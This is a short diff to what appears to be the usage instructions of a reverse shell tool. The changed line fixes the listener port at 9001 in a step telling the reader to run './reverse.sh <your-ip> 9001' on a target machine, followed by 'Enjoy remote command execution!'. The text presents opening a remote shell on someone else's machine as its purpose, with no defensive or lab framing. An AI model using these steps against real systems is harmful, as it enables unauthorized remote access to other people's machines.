@@ -34,7 +34,7 @@
 
 2. Execute the reverse shell script on the target machine:
    ```bash
-   ./reverse.sh <your-ip> <port>
+   ./reverse.sh <your-ip> 9001
    ```
 
 3. Enjoy remote command execution!
